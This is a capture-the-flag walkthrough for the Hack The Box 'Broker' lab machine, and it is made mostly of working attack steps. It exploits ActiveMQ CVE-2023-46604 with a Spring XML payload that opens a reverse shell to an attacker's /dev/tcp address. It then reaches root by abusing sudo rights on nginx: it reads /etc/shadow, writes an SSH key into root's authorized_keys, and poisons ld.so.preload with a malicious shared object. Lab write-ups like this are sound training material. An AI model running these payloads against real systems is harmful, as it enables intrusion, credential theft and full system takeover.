# 🧠 HTB: Broker (Easy, Linux)

## 📦 Box Info
- **Release Date:** 09 Nov 2023
- **IP:** 10.10.11.243
- **Points:** 20
- **OS:** Linux
- **Created by:** TheCyberGeek
- **Notable CVEs:** 
  - CVE-2023-46604 (ActiveMQ RCE)
  - CVE-2022-41347 (Zimbra-like LD_PRELOAD abuse)

---

## 🔍 Recon

```bash
nmap -p- --min-rate 10000 10.10.11.243
nmap -p 22,80,1883,5672,8161,39751,61613,61614,61616 -sCV 10.10.11.243
```

- 80: nginx, requires HTTP Basic Auth (`admin:admin`)
- 8161: Jetty webserver (ActiveMQ console)
- 61616: ActiveMQ 5.15.15 (vulnerable)
- MQTT, AMQP also running (ports 1883, 5672)

---

## 🐚 Shell as `activemq`

### 🧨 CVE-2023-46604 – ActiveMQ RCE

#### Step 1: Host malicious Spring XML

Edit `poc.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans 
       http://www.springframework.org/schema/beans/spring-beans.xsd">
  <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
    <constructor-arg>
      <list>
        <value>bash</value>
        <value>-c</value>
        <value>bash -i &gt;&amp; /dev/tcp/10.10.14.6/9001 0&gt;&amp;1</value>
      </list>
    </constructor-arg>
  </bean>
</beans>
```

Host it:

```bash
python3 -m http.server
```

#### Step 2: Exploit

```bash
python3 exploit.py -i 10.10.11.243 -u http://10.10.14.6/poc.xml
```

#### Step 3: Catch Shell

```bash
nc -lnvp 9001
```

#### Upgrade Shell

```bash
script /dev/null -c bash
# [CTRL+Z]
stty raw -echo; fg
reset
export TERM=screen
```

---

## 🧑‍💻 Shell as Root

```bash
sudo -l
# (ALL) NOPASSWD: /usr/sbin/nginx
```

---

### 🧬 Method 1: File Read via Root nginx

`nginx.conf`:

```nginx
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

Start nginx:

```bash
sudo /usr/sbin/nginx -c /dev/shm/nginx.conf
```

Read files:

```bash
curl localhost:1337/etc/shadow
curl localhost:1337/root/root.txt
```

---

### ✍️ Method 2: File Write via DAV PUT

Updated `nginx.conf`:

```nginx
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1338;
        root /;
        autoindex on;
        dav_methods PUT;
    }
}
```

Start server:

```bash
sudo /usr/sbin/nginx -c /dev/shm/nginx.conf
```

Write SSH key:

```bash
curl -X PUT localhost:1338/root/.ssh/authorized_keys \
    -d 'ssh-ed25519 AAAA... user@host'
```

SSH as root:

```bash
ssh -i id_ed25519 root@10.10.11.243
```

---

### ☠️ Method 3: LD_PRELOAD Poisoning

#### 1. Write `nginx.conf` with poisoned error_log

```nginx
user root;
error_log /etc/ld.so.preload warn;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1339;
        root /;
    }
}
```

```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf
curl localhost:1339/tmp/pwn.so
```

#### 2. Create malicious `.so`

```c
// pwn.c
#include <unistd.h>
#include <sys/types.h>
__attribute__ ((__constructor__))
void dropshell(void){
   chown("/tmp/rootshell", 0, 0);
   chmod("/tmp/rootshell", 04755);
   unlink("/etc/ld.so.preload");
}
```

```bash
gcc -fPIC -shared -o /tmp/pwn.so pwn.c -ldl
cp /bin/bash /tmp/rootshell
```

#### 3. Trigger Load

```bash
sudo -l
/tmp/rootshell -p
```

---

## 🏁 Flags

```bash
cat /home/activemq/user.txt
cat /root/root.txt
```